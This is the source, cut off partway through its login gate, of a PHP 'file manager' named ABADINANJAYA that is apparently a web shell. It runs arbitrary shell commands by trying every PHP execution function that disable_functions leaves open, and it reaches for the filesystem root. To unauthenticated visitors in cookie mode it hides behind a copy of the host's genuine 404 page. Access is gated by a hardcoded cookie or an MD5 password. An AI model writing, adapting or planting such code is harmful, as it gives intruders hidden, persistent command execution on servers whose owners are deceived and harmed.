<?php
/**
 * ABADINANJAYA File Manager
 * Single-file | Cross-OS (Windows/Linux/macOS) | PHP 5.6+ / 7.x / 8.x
 */
if (!defined('PHP_VERSION_ID')) {
    $___v = explode('.', PHP_VERSION);
    define('PHP_VERSION_ID', (int)$___v[0] * 10000 + (int)$___v[1] * 100 + (int)$___v[2]);
}
if (PHP_VERSION_ID < 50600) {
    header('Content-Type: text/plain; charset=utf-8');
    die('ABADINANJAYA requires PHP 5.6 or newer. Current: ' . PHP_VERSION);
}

/* ---- polyfills ---- */
if (!function_exists('hash_equals')) {
    function hash_equals($known_string, $user_string) {
        if (!is_string($known_string) || !is_string($user_string)) return false;
        $len = strlen($known_string);
        if ($len !== strlen($user_string)) return false;
        $res = 0;
        for ($i = 0; $i < $len; $i++) {
            $res |= ord($known_string[$i]) ^ ord($user_string[$i]);
        }
        return $res === 0;
    }
}
if (!function_exists('http_response_code')) {
    function http_response_code($code = null) {
        static $current = 200;
        if ($code !== null) {
            $current = (int)$code;
            if (!headers_sent()) {
                header('HTTP/1.1 ' . $current, true, $current);
            }
        }
        return $current;
    }
}
function fm_arr($a, $k, $default = null) {
    return (is_array($a) && array_key_exists($k, $a)) ? $a[$k] : $default;
}
function fm_req($key, $default = '') {
    if (isset($_POST[$key])) return $_POST[$key];
    if (isset($_GET[$key])) return $_GET[$key];
    return $default;
}
function fm_is_win() {
    if (defined('PHP_OS_FAMILY') && PHP_OS_FAMILY === 'Windows') return true;
    return strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
}

/** List disable_functions (normalized) */
function fm_disabled_functions() {
    $d = ini_get('disable_functions');
    if (!is_string($d) || $d === '') return array();
    $parts = preg_split('/\s*,\s*/', strtolower($d));
    $out = array();
    foreach ($parts as $p) {
        $p = trim($p);
        if ($p !== '') $out[] = $p;
    }
    // suhosin blacklist
    if (function_exists('ini_get')) {
        $s = ini_get('suhosin.executor.func.blacklist');
        if (is_string($s) && $s !== '') {
            foreach (preg_split('/\s*,\s*/', strtolower($s)) as $p) {
                $p = trim($p);
                if ($p !== '' && !in_array($p, $out, true)) $out[] = $p;
            }
        }
    }
    return $out;
}

/** Cek fungsi boleh dipakai (exists + tidak di disable_functions) */
function fm_func_ok($fn) {
    $fn = strtolower((string)$fn);
    if ($fn === '') return false;
    if (!function_exists($fn)) return false;
    $dis = fm_disabled_functions();
    if (in_array($fn, $dis, true)) return false;
    return true;
}

/**
 * Jalankan command murni lewat PHP function saja (tanpa cmd.exe / sh -c wrapper).
 * cwd lewat chdir / argumen proc_open. Coba function yang tidak di-disable.
 */
function fm_term_run($cmd, $cwd) {
    $cmd = (string)$cmd;
    $cwd = (string)$cwd;
    $tried = array();
    $lastErr = '';

    // cwd via chdir (jika tersedia)
    $old = null;
    $chdirOk = false;
    if (fm_func_ok('getcwd')) $old = @getcwd();
    if (fm_func_ok('chdir') && $cwd !== '') {
        $chdirOk = @chdir($cwd);
    }

    $restore = function () use ($old, $chdirOk) {
        if ($old && $chdirOk && fm_func_ok('chdir')) @chdir($old);
    };

    // --- proc_open: command apa adanya, cwd sebagai argumen ke-4 ---
    if (fm_func_ok('proc_open')) {
        $tried[] = 'proc_open';
        $dsc = array(
            0 => array('pipe', 'r'),
            1 => array('pipe', 'w'),
            2 => array('pipe', 'w'),
        );
        $pipes = array();
        $proc = @proc_open($cmd, $dsc, $pipes, ($cwd !== '' ? $cwd : null), null);
        if (is_resource($proc)) {
            if (isset($pipes[0]) && is_resource($pipes[0])) @fclose($pipes[0]);
            $stdout = '';
            $stderr = '';
            if (isset($pipes[1]) && is_resource($pipes[1])) {
                $stdout = (string)@stream_get_contents($pipes[1]);
                @fclose($pipes[1]);
            }
            if (isset($pipes[2]) && is_resource($pipes[2])) {
                $stderr = (string)@stream_get_contents($pipes[2]);
                @fclose($pipes[2]);
            }
            $code = @proc_close($proc);
            $out = $stdout;
            if ($stderr !== '') $out .= ($out !== '' ? "\n" : '') . $stderr;
            $restore();
            return array('ok' => true, 'output' => $out, 'code' => (int)$code, 'runner' => 'proc_open', 'tried' => $tried);
        }
        $lastErr = 'proc_open gagal';
    }

    // --- popen ---
    if (fm_func_ok('popen') && fm_func_ok('pclose')) {
        $tried[] = 'popen';
        $h = @popen($cmd, 'r');
        if (is_resource($h)) {
            $out = (string)@stream_get_contents($h);
            $code = @pclose($h);
            $restore();
            return array('ok' => true, 'output' => $out, 'code' => (int)$code, 'runner' => 'popen', 'tried' => $tried);
        }
        $lastErr = 'popen gagal';
    }

    // --- shell_exec ---
    if (fm_func_ok('shell_exec')) {
        $tried[] = 'shell_exec';
        $out = @shell_exec($cmd);
        if ($out !== null) {
            $restore();
            return array('ok' => true, 'output' => (string)$out, 'code' => 0, 'runner' => 'shell_exec', 'tried' => $tried);
        }
        $lastErr = 'shell_exec null';
    }

    // --- exec ---
    if (fm_func_ok('exec')) {
        $tried[] = 'exec';
        $lines = array();
        $code = 0;
        @exec($cmd, $lines, $code);
        $restore();
        return array('ok' => true, 'output' => implode("\n", $lines), 'code' => (int)$code, 'runner' => 'exec', 'tried' => $tried);
    }

    // --- system ---
    if (fm_func_ok('system')) {
        $tried[] = 'system';
        ob_start();
        $ret = 0;
        @system($cmd, $ret);
        $out = ob_get_clean();
        $restore();
        return array('ok' => true, 'output' => (string)$out, 'code' => (int)$ret, 'runner' => 'system', 'tried' => $tried);
    }

    // --- passthru ---
    if (fm_func_ok('passthru')) {
        $tried[] = 'passthru';
        ob_start();
        $ret = 0;
        @passthru($cmd, $ret);
        $out = ob_get_clean();
        $restore();
        return array('ok' => true, 'output' => (string)$out, 'code' => (int)$ret, 'runner' => 'passthru', 'tried' => $tried);
    }

    $restore();

    return array(
        'ok' => false,
        'error' => 'Tidak ada fungsi shell yang bisa dipakai'
            . ($lastErr !== '' ? ' (' . $lastErr . ')' : '')
            . '. Disable: ' . implode(', ', fm_disabled_functions()),
        'tried' => $tried,
        'output' => '',
        'code' => -1,
        'runner' => '',
    );
}
function fm_norm($p) {
    $p = str_replace('\\', '/', (string)$p);
    if ($p === '') return '';
    if ($p === '/') return '/';
    if (preg_match('#^[A-Za-z]:/$#', $p)) return strtoupper($p[0]) . ':';
    if (preg_match('#^[A-Za-z]:$#', $p)) return strtoupper($p[0]) . ':';
    $p = preg_replace('#/+#', '/', $p);
    if ($p !== '/' && substr($p, -1) === '/') $p = rtrim($p, '/');
    return $p;
}
function fm_path_eq($a, $b) {
    $a = fm_norm($a); $b = fm_norm($b);
    if (fm_is_win()) return strcasecmp($a, $b) === 0;
    return $a === $b;
}
function fm_path_under($parent, $child) {
    $p = fm_norm($parent);
    $c = fm_norm($child);
    if (fm_is_win()) { $p = strtolower($p); $c = strtolower($c); }
    if ($p === '/') return ($c !== '' && isset($c[0]) && $c[0] === '/');
    if (preg_match('#^[a-z]:$#', $p)) {
        return (bool)preg_match('#^' . preg_quote($p, '#') . '(/|$)#', $c);
    }
    return $c === $p || strpos($c, $p . '/') === 0;
}
function fm_detect_root() {
    $here = @realpath(dirname(__FILE__));
    if ($here === false) $here = dirname(__FILE__);
    $ob = ini_get('open_basedir');
    if (is_string($ob) && $ob !== '') {
        $chunks = preg_split('#' . preg_quote(PATH_SEPARATOR, '#') . '#', $ob);
        foreach ($chunks as $ch) {
            $ch = trim($ch);
            if ($ch === '') continue;
            $r = @realpath($ch);
            if ($r !== false && fm_path_under($r, $here)) return $r;
            if ($r !== false) return $r;
        }
    }
    if (fm_is_win()) {
        if (preg_match('#^([A-Za-z]:)[\\\\/]#', $here, $m)) {
            $drive = strtoupper($m[1]) . '\\';
            $r = @realpath($drive);
            return ($r !== false) ? $r : $drive;
        }
    }
    $r = @realpath('/');
    return ($r !== false) ? $r : '/';
}
if (function_exists('session_status')) {
    if (session_status() === PHP_SESSION_NONE) { @session_start(); }
} else {
    if (session_id() === '') { @session_start(); }
}
@error_reporting(E_ALL);
@ini_set('display_errors', '0');
@ini_set('default_charset', 'UTF-8');
if (function_exists('mb_internal_encoding')) { @mb_internal_encoding('UTF-8'); }

/* ========== CONFIG ========== */
define('FM_NAME', 'ABADI NAN JAYA');
define('FM_VERSION', '1.1.0');
/** Title: [{HOST}] */
function fm_page_title() {
    $host = '';
    if (!empty($_SERVER['HTTP_HOST'])) $host = $_SERVER['HTTP_HOST'];
    elseif (!empty($_SERVER['SERVER_NAME'])) $host = $_SERVER['SERVER_NAME'];
    else $host = 'localhost';
    $host = preg_replace('/:\d+$/', '', $host);
    return '[' . $host . ']';
}
define('FM_IS_WIN', fm_is_win());
define('FM_ROOT', fm_detect_root());
define('FM_MAX_UPLOAD', 64 * 1024 * 1024);
define('FM_EDIT_MAX', 2 * 1024 * 1024);
/* ========== AUTH CONFIG (edit di sini) ========== */
/**
 * FM_AUTH_MODE:
 *   'none'     = tanpa login (terbuka)
 *   'cookie'   = cukup set cookie (nama/value di bawah)
 *   'password' = password only (form di halaman 404)
 *   'userpass' = username + password (form di halaman 404)
 */
define('FM_AUTH_MODE', 'password');
define('FM_AUTH_USER', 'abadinanjaya');
define('FM_AUTH_PASS', 'f6b87c765ba9194e7e664597f5c3f50f');
define('FM_COOKIE_NAME', 'abadinanjaya');
define('FM_COOKIE_VALUE', 'abadinanjayateam');
define('FM_CLOAK_404', true);
define('FM_SHOW_LOGIN_ON_404', false);
define('FM_ICON_URL', 'https://raw.githubusercontent.com/BlackNovaHub/AbadiNanJaya/refs/heads/main/icon.png');
define('FM_LOGO_URL', 'https://raw.githubusercontent.com/BlackNovaHub/AbadiNanJaya/refs/heads/main/icon.png');

/** Password mode: selalu MD5 */
function fm_is_md5_hex($s) {
    return (bool)preg_match('/^[a-f0-9]{32}$/i', (string)$s);
}
function fm_pass_md5($plain) {
    return md5((string)$plain);
}
/** Cocokkan input plain dengan stored (MD5 atau plain lama → tetap lolos sekali) */
function fm_pass_ok($inputPlain, $stored) {
    $stored = (string)$stored;
    $in = (string)$inputPlain;
    $hash = fm_pass_md5($in);
    if (hash_equals($stored, $hash)) return true;
    // backward: kalau stored masih plain text
    if (!fm_is_md5_hex($stored) && hash_equals($stored, $in)) return true;
    return false;
}
/** Pastikan nilai password tersimpan MD5 */
function fm_pass_store($plainOrHash) {
    $s = (string)$plainOrHash;
    if ($s === '') return '';
    if (fm_is_md5_hex($s)) return strtolower($s);
    return fm_pass_md5($s);
}

function fm_settings() {
    return array(
        'auth_mode' => FM_AUTH_MODE,
        'username' => FM_AUTH_USER,
        'password' => FM_AUTH_PASS,
        'cookie_name' => FM_COOKIE_NAME,
        'cookie_value' => FM_COOKIE_VALUE,
        'cloak_404' => (bool)FM_CLOAK_404,
        'show_login_on_404' => (bool)FM_SHOW_LOGIN_ON_404,
    );
}

/** Simpan settings dengan rewrite define() di index.php (tanpa JSON) */
function fm_save_settings_to_index($data) {
    $file = dirname(__FILE__) . DIRECTORY_SEPARATOR . 'index.php';
    if (!is_writable($file) && !is_writable(dirname($file))) return false;
    $src = @file_get_contents($file);
    if ($src === false) return false;

    $mode = isset($data['auth_mode']) ? (string)$data['auth_mode'] : 'cookie';
    if (!in_array($mode, array('none', 'cookie', 'password', 'userpass'), true)) $mode = 'cookie';
    $user = isset($data['username']) ? (string)$data['username'] : 'admin';
    $pass = isset($data['password']) ? (string)$data['password'] : '';
    // password / userpass → simpan MD5 otomatis
    if ($mode === 'password' || $mode === 'userpass') {
        $pass = fm_pass_store($pass);
    }
    $cname = isset($data['cookie_name']) ? preg_replace('/[^a-zA-Z0-9_\-]/', '', (string)$data['cookie_name']) : 'abadinanjaya';
    if ($cname === '') $cname = 'abadinanjaya';
    $cval = isset($data['cookie_value']) ? (string)$data['cookie_value'] : 'kontol';
    $cloak = !empty($data['cloak_404']);
    $showLogin = !empty($data['show_login_on_404']);

    $esc = function ($s) {
        return str_replace(array('\\', "'"), array('\\\\', "\\'"), (string)$s);
    };

    $map = array(
        'FM_AUTH_MODE' => "'" . $esc($mode) . "'",
        'FM_AUTH_USER' => "'" . $esc($user) . "'",
        'FM_AUTH_PASS' => "'" . $esc($pass) . "'",
        'FM_COOKIE_NAME' => "'" . $esc($cname) . "'",
        'FM_COOKIE_VALUE' => "'" . $esc($cval) . "'",
        'FM_CLOAK_404' => $cloak ? 'true' : 'false',
        'FM_SHOW_LOGIN_ON_404' => $showLogin ? 'true' : 'false',
    );

    foreach ($map as $name => $val) {
        // match define line including optional trailing comment
        $pat = "/define\\(\\s*'" . preg_quote($name, '/') . "'\\s*,\\s*[^;]+\\);[^\\r\\n]*/";
        $rep = "define('" . $name . "', " . $val . ");";
        $src2 = preg_replace($pat, $rep, $src, 1, $count);
        if ($count < 1) return false;
        $src = $src2;
    }

    $tmp = $file . '.tmp';
    if (@file_put_contents($tmp, $src) === false) return false;
    if (!@rename($tmp, $file)) {
        // Windows fallback
        @unlink($file);
        if (!@rename($tmp, $file)) {
            @file_put_contents($file, $src);
            @unlink($tmp);
        }
    }
    return array(
        'auth_mode' => $mode,
        'username' => $user,
        'password' => $pass,
        'cookie_name' => $cname,
        'cookie_value' => $cval,
        'cloak_404' => $cloak,
        'show_login_on_404' => $showLogin,
    );
}



function fm_is_authed() {
    $mode = FM_AUTH_MODE;
    // Tanpa login: selalu lolos
    if ($mode === 'none') return true;

    // Cookie mode: hanya cookie name=value
    if ($mode === 'cookie') {
        if (!isset($_COOKIE[FM_COOKIE_NAME])) return false;
        return hash_equals((string)FM_COOKIE_VALUE, (string)$_COOKIE[FM_COOKIE_NAME]);
    }

    // password / userpass: SESSION saja (bukan cookie abadinanjaya)
    if ($mode === 'password' || $mode === 'userpass') {
        return !empty($_SESSION['fm_logged_in']) && $_SESSION['fm_logged_in'] === true
            && isset($_SESSION['fm_auth_mode']) && $_SESSION['fm_auth_mode'] === $mode;
    }

    return false;
}

/** Cookie mode only */
function fm_set_auth_cookie() {
    $secure = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off');
    if (!headers_sent()) {
        setcookie(FM_COOKIE_NAME, FM_COOKIE_VALUE, time() + 86400 * 30, '/', '', $secure, true);
    }
    $_COOKIE[FM_COOKIE_NAME] = FM_COOKIE_VALUE;
}

/** Session login untuk password / userpass */
function fm_set_auth_session() {
    $_SESSION['fm_logged_in'] = true;
    $_SESSION['fm_auth_mode'] = FM_AUTH_MODE;
    $_SESSION['fm_auth_at'] = time();
}

function fm_logout_cookie() {
    // clear cookie auth
    if (!headers_sent()) {
        setcookie(FM_COOKIE_NAME, '', time() - 3600, '/');
        setcookie(FM_COOKIE_NAME, '', time() - 3600, '/', '', false, true);
    }
    unset($_COOKIE[FM_COOKIE_NAME]);
    // clear session auth
    unset($_SESSION['fm_logged_in'], $_SESSION['fm_auth_mode'], $_SESSION['fm_auth_at']);
}

function fm_base_url() {
    $https = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off')
        || (isset($_SERVER['SERVER_PORT']) && (string)$_SERVER['SERVER_PORT'] === '443')
        || (!empty($_SERVER['HTTP_X_FORWARDED_PROTO']) && strtolower($_SERVER['HTTP_X_FORWARDED_PROTO']) === 'https');
    $scheme = $https ? 'https' : 'http';
    $host = !empty($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'localhost';
    return $scheme . '://' . $host;
}

function fm_fetch_host_404() {
    $base = fm_base_url();
    $rand = function_exists('random_bytes')
        ? bin2hex(random_bytes(8))
        : strtolower(dechex(mt_rand(0x100000, 0xffffff)) . dechex(mt_rand(0x100000, 0xffffff)));
    $paths = array(
        '/generate.php',
        '/' . $rand . '.php',
        '/' . $rand . '.html',
        '/.' . $rand,
        '/' . $rand,
    );
    $ua = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Mozilla/5.0';
    $body = false;
    $contentType = 'text/html; charset=utf-8';
    $status = 404;

    foreach ($paths as $path) {
        $url = $base . $path;
        $data = false;
        $ct = '';
        $code = 0;

        if (function_exists('curl_init')) {
            $ch = curl_init($url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
            curl_setopt($ch, CURLOPT_TIMEOUT, 8);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 4);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_USERAGENT, $ua);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array('X-FM-404-Probe: 1'));
            $data = curl_exec($ch);
            $code = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
            $ct = (string)curl_getinfo($ch, CURLINFO_CONTENT_TYPE);
            curl_close($ch);
        } elseif (ini_get('allow_url_fopen')) {
            $ctx = stream_context_create(array(
                'http' => array(
                    'method' => 'GET',
                    'timeout' => 8,
                    'ignore_errors' => true,
                    'header' => "User-Agent: $ua\r\nX-FM-404-Probe: 1\r\n",
                ),
                'ssl' => array('verify_peer' => false, 'verify_peer_name' => false),
            ));
            $data = @file_get_contents($url, false, $ctx);
            if (isset($http_response_header) && is_array($http_response_header)) {
                foreach ($http_response_header as $h) {
                    if (preg_match('#^HTTP/\S+\s+(\d+)#', $h, $m)) $code = (int)$m[1];
                    if (stripos($h, 'Content-Type:') === 0) $ct = trim(substr($h, 13));
                }
            }
        }

        if ($data !== false && $data !== '' && $code >= 400) {
            if (stripos($data, 'toolsBar') !== false) continue;
            $body = $data;
            $status = $code > 0 ? $code : 404;
            if ($ct !== '') $contentType = $ct;
            break;
        }
    }

    if ($body === false || $body === '') {
        $host = !empty($_SERVER['HTTP_HOST']) ? htmlspecialchars($_SERVER['HTTP_HOST'], ENT_QUOTES, 'UTF-8') : 'localhost';
        $uri = isset($_SERVER['REQUEST_URI']) ? htmlspecialchars($_SERVER['REQUEST_URI'], ENT_QUOTES, 'UTF-8') : '/';
        $body = '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">' . "\n"
            . "<html><head>\n<title>404 Not Found</title>\n</head><body>\n"
            . "<h1>Not Found</h1>\n"
            . "<p>The requested URL $uri was not found on this server.</p>\n"
            . "<hr>\n"
            . '<address>Apache Server at ' . $host . ' Port '
            . (isset($_SERVER['SERVER_PORT']) ? (int)$_SERVER['SERVER_PORT'] : 80)
            . "</address>\n</body></html>\n";
        $status = 404;
        $contentType = 'text/html; charset=iso-8859-1';
    }

    return array($status, $contentType, $body);
}

function fm_login_action_url() {
    $action = isset($_SERVER['REQUEST_URI']) ? strtok($_SERVER['REQUEST_URI'], '?') : 'index.php';
    return htmlspecialchars($action, ENT_QUOTES, 'UTF-8');
}

/**
 * Halaman login khusus — Password Only
 */
function fm_show_login_password($error = '') {
    $title = htmlspecialchars(fm_page_title(), ENT_QUOTES, 'UTF-8');
    $logo = htmlspecialchars(FM_LOGO_URL, ENT_QUOTES, 'UTF-8');
    $icon = htmlspecialchars(FM_ICON_URL, ENT_QUOTES, 'UTF-8');
    $action = fm_login_action_url();
    $err = $error !== ''
        ? '<div class="err">' . htmlspecialchars($error, ENT_QUOTES, 'UTF-8') . '</div>'
        : '';
    while (function_exists('ob_get_level') && ob_get_level() > 0) { @ob_end_clean(); }
    http_response_code(401);
    header('Content-Type: text/html; charset=utf-8');
    header('Cache-Control: no-store');
    echo '<!DOCTYPE html><html lang="id"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">'
        . '<title>' . $title . '</title><link rel="icon" href="' . $icon . '">'
        . '<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">'
        . '<style>
*{box-sizing:border-box;margin:0;padding:0}
body{min-height:100vh;font-family:Inter,system-ui,sans-serif;color:#f4ffe6;
background:radial-gradient(ellipse 80% 50% at 20% -10%,rgba(192,240,0,.14),transparent 50%),
radial-gradient(ellipse 60% 40% at 100% 0%,rgba(240,208,0,.1),transparent 45%),#000;
display:flex;align-items:center;justify-content:center;padding:20px}
.card{width:min(400px,100%);background:linear-gradient(180deg,#0e1508,#0a0f06);border:1px solid #243016;border-radius:20px;
padding:28px 26px 30px;box-shadow:0 24px 60px rgba(0,0,0,.55),0 0 40px rgba(192,240,0,.08)}
.badge{display:inline-block;font-size:10px;font-weight:800;letter-spacing:.14em;text-transform:uppercase;
color:#0a1000;background:linear-gradient(135deg,#c0f000,#f0d000);padding:5px 10px;border-radius:7px;margin-bottom:14px;
box-shadow:0 0 14px rgba(192,240,0,.3)}
.logo{display:block;width:min(260px,100%);height:auto;margin:0 auto 18px;filter:drop-shadow(0 0 16px rgba(192,240,0,.35))}
h1{font-size:18px;font-weight:800;text-align:center;margin:0 0 6px;
background:linear-gradient(90deg,#c0f000,#f0d000);-webkit-background-clip:text;background-clip:text;color:transparent}
.sub{text-align:center;color:#a3bf78;font-size:13px;margin-bottom:22px}
label{display:block;font-size:11px;font-weight:700;letter-spacing:.06em;text-transform:uppercase;color:#a3bf78;margin:0 0 7px}
input{width:100%;padding:13px 14px;border-radius:11px;border:1px solid #354a22;background:#050805;color:#f4ffe6;font-size:15px;outline:none}
input:focus{border-color:#c0f000;box-shadow:0 0 0 3px rgba(192,240,0,.22)}
.field{margin-bottom:14px}
button{width:100%;margin-top:6px;padding:13px;border:0;border-radius:11px;cursor:pointer;font-weight:800;font-size:14px;letter-spacing:.04em;
background:linear-gradient(135deg,#c0f000,#9ad400);color:#0a1000;box-shadow:0 6px 20px rgba(192,240,0,.28)}
button:hover{filter:brightness(1.06)}
.err{background:rgba(255,69,69,.12);border:1px solid rgba(255,69,69,.35);color:#ff9a9a;padding:10px 12px;border-radius:10px;font-size:13px;margin-bottom:14px}
.foot{margin-top:16px;text-align:center;font-size:11px;color:#6a8250}
</style></head><body>
<form class="card" method="post" action="' . $action . '" autocomplete="on">
  <div style="text-align:center"><span class="badge">Password Only</span></div>
  <img class="logo" src="' . $logo . '" alt="logo">
  <h1>ABADI NAN JAYA</h1>
  <p class="sub">Masukkan password untuk melanjutkan</p>
  ' . $err . '
  <input type="hidden" name="fm_do_login" value="1">
  <div class="field"><label for="fm_pass">Password</label>
  <input id="fm_pass" name="fm_pass" type="password" required autofocus placeholder="••••••••" autocomplete="current-password"></div>
  <button type="submit">MASUK</button>
  <p class="foot">Session login · password only · no auth cookie</p>
</form></body></html>';
    exit;
}

/**
 * Halaman login khusus — Username + Password
 */
function fm_show_login_userpass($error = '') {
    $title = htmlspecialchars(fm_page_title(), ENT_QUOTES, 'UTF-8');
    $logo = htmlspecialchars(FM_LOGO_URL, ENT_QUOTES, 'UTF-8');
    $icon = htmlspecialchars(FM_ICON_URL, ENT_QUOTES, 'UTF-8');
    $action = fm_login_action_url();
    $err = $error !== ''
        ? '<div class="err">' . htmlspecialchars($error, ENT_QUOTES, 'UTF-8') . '</div>'
        : '';
    while (function_exists('ob_get_level') && ob_get_level() > 0) { @ob_end_clean(); }
    http_response_code(401);
    header('Content-Type: text/html; charset=utf-8');
    header('Cache-Control: no-store');
    echo '<!DOCTYPE html><html lang="id"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">'
        . '<title>' . $title . '</title><link rel="icon" href="' . $icon . '">'
        . '<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">'
        . '<style>
*{box-sizing:border-box;margin:0;padding:0}
body{min-height:100vh;font-family:Inter,system-ui,sans-serif;color:#f4ffe6;
background:radial-gradient(ellipse 70% 45% at 80% -5%,rgba(240,208,0,.12),transparent 50%),
radial-gradient(ellipse 80% 55% at 10% 100%,rgba(192,240,0,.1),transparent 55%),#000;
display:grid;place-items:center;padding:20px}
.shell{width:min(860px,100%);display:grid;grid-template-columns:1.05fr .95fr;gap:0;border-radius:22px;overflow:hidden;
border:1px solid #243016;box-shadow:0 28px 70px rgba(0,0,0,.6),0 0 50px rgba(192,240,0,.07);background:#0a0f06}
@media(max-width:720px){.shell{grid-template-columns:1fr}}
.aside{padding:36px 28px;background:
linear-gradient(160deg,rgba(192,240,0,.14),transparent 45%),
linear-gradient(180deg,#121a0c,#0a0f06);border-right:1px solid #1e2c14;display:flex;flex-direction:column;justify-content:center;gap:14px}
@media(max-width:720px){.aside{border-right:0;border-bottom:1px solid #1e2c14;padding:24px}}
.aside .badge{align-self:flex-start;font-size:10px;font-weight:800;letter-spacing:.14em;text-transform:uppercase;
color:#0a1000;background:linear-gradient(135deg,#f0d000,#c0f000);padding:5px 10px;border-radius:7px}
.aside .logo{width:min(240px,90%);filter:drop-shadow(0 0 18px rgba(192,240,0,.35))}
.aside h2{font-size:22px;font-weight:800;line-height:1.2;background:linear-gradient(90deg,#c0f000,#f0d000);
-webkit-background-clip:text;background-clip:text;color:transparent}
.aside p{color:#a3bf78;font-size:13px;line-height:1.55}
.panel{padding:34px 28px;display:flex;flex-direction:column;justify-content:center}
.panel h1{font-size:16px;font-weight:800;margin:0 0 4px;letter-spacing:.04em}
.panel .sub{color:#6a8250;font-size:12px;margin-bottom:20px}
label{display:block;font-size:11px;font-weight:700;letter-spacing:.06em;text-transform:uppercase;color:#a3bf78;margin:0 0 7px}
input{width:100%;padding:12px 14px;border-radius:11px;border:1px solid #354a22;background:#050805;color:#f4ffe6;font-size:14px;outline:none}
input:focus{border-color:#c0f000;box-shadow:0 0 0 3px rgba(192,240,0,.22)}
.field{margin-bottom:14px}
button{width:100%;margin-top:8px;padding:13px;border:0;border-radius:11px;cursor:pointer;font-weight:800;font-size:14px;
background:linear-gradient(135deg,#c0f000,#9ad400);color:#0a1000;box-shadow:0 6px 20px rgba(192,240,0,.28)}
button:hover{filter:brightness(1.06)}
.err{background:rgba(255,69,69,.12);border:1px solid rgba(255,69,69,.35);color:#ff9a9a;padding:10px 12px;border-radius:10px;font-size:13px;margin-bottom:14px}
.row{display:flex;align-items:center;gap:8px;margin-top:14px;color:#6a8250;font-size:11px}
.dot{width:7px;height:7px;border-radius:50%;background:#c0f000;box-shadow:0 0 8px #c0f000}
</style></head><body>
<div class="shell">
  <aside class="aside">
    <span class="badge">Username + Password</span>
    <img class="logo" src="' . $logo . '" alt="logo">
    <h2>Secure dual-factor gate</h2>
    <p>Mode login dua field. Username dan password wajib cocok sebelum masuk file manager.</p>
  </aside>
  <section class="panel">
    <h1>Sign in</h1>
    <p class="sub">ABADI NAN JAYA · userpass mode</p>
    ' . $err . '
    <form method="post" action="' . $action . '" autocomplete="on">
      <input type="hidden" name="fm_do_login" value="1">
      <div class="field"><label for="fm_user">Username</label>
      <input id="fm_user" name="fm_user" type="text" required autofocus placeholder="username" autocomplete="username"></div>
      <div class="field"><label for="fm_pass">Password</label>
      <input id="fm_pass" name="fm_pass" type="password" required placeholder="••••••••" autocomplete="current-password"></div>
      <button type="submit">LOGIN</button>
    </form>
    <div class="row"><span class="dot"></span> Session login · username + password · no auth cookie</div>
  </section>
</div>
</body></html>';
    exit;
}

/**
 * Cookie mode: 404 cloak (+ optional mini form)
 */
function fm_cloak_404($login_error = '') {
    if (!empty($_SERVER['HTTP_X_FM_404_PROBE'])) {
        http_response_code(404);
        header('Content-Type: text/plain; charset=utf-8');
        echo 'Not Found';
        exit;
    }
    // Cookie mode: murni 404 dari host (generate.php / path acak) — TANPA form apapun
    list($status, $ct, $body) = fm_fetch_host_404();
    // selalu kirim 404 ke client (bukan 200), meski upstream aneh
    $status = 404;

    while (function_exists('ob_get_level') && ob_get_level() > 0) { @ob_end_clean(); }
    if (!headers_sent()) {
        http_response_code(404);
        header('HTTP/1.1 404 Not Found', true, 404);
        header('Content-Type: ' . ($ct ? $ct : 'text/html; charset=utf-8'));
        header('Cache-Control: no-store, no-cache, must-revalidate');
        header('X-Robots-Tag: noindex, nofollow');
    }
    echo $body;
    exit;
}

/**
 * Router tampilan login per mode:
 *   none     → tidak dipanggil (terbuka)
 *   password → halaman login Password Only (bukan 404)
 *   userpass → halaman login Username+Password (bukan 404)
 *   cookie   → 404 Not Found saja
 */
function fm_show_auth_gate($login_error = '') {
    $mode = FM_AUTH_MODE;
    if ($mode === 'password') {
        fm_show_login_password($login_error); // exit
        return;
    }
    if ($mode === 'userpass') {
        fm_show_login_userpass($login_error); // exit
        return;
    }
    // HANYA cookie yang pakai tampilan 404
    if ($mode === 'cookie') {
        fm_cloak_404($login_error); // exit
        return;
    }
    // fallback aman
    http_response_code(403);
    header('Content-Type: text/plain; charset=utf-8');
    echo 'Forbidden';
    exit;
}

function fm_try_login_post() {
    if (!isset($_POST['fm_do_login'])) return false;
    $mode = FM_AUTH_MODE;
    if ($mode === 'none') return false;
    $pass = isset($_POST['fm_pass']) ? (string)$_POST['fm_pass'] : '';
    $user = isset($_POST['fm_user']) ? (string)$_POST['fm_user'] : '';
    $ok = false;
    if ($mode === 'cookie') {
        // cookie mode: tanpa form — login lewat cookie saja
        $ok = false;
    } elseif ($mode === 'password') {
        $ok = fm_pass_ok($pass, FM_AUTH_PASS);
    } elseif ($mode === 'userpass') {
        $ok = hash_equals((string)FM_AUTH_USER, $user) && fm_pass_ok($pass, FM_AUTH_PASS);
    }
    if ($ok) {
        if ($mode === 'cookie') {
            fm_set_auth_cookie();
        } else {
            // password / userpass → session, tanpa cookie abadinanjaya
            fm_set_auth_session();
        }
        $uri = isset($_SERVER['REQUEST_URI']) ? strtok($_SERVER['REQUEST_URI'], '?') : 'index.php';
        header('Location: ' . $uri);
        exit;
    }
    return 'Login gagal.';
}

/* ========== AUTH GATE ========== */
if (isset($_GET['logout'])) {
    fm_logout_cookie();
    $uri = isset($_SERVER['REQUEST_URI']) ? strtok($_SERVER['REQUEST_URI'], '?') : 'index.php';
    header('Location: ' . $uri);
    exit;
}

$__login_err = '';
if (isset($_POST['fm_do_login'])) {
    $__r = fm_try_login_post();
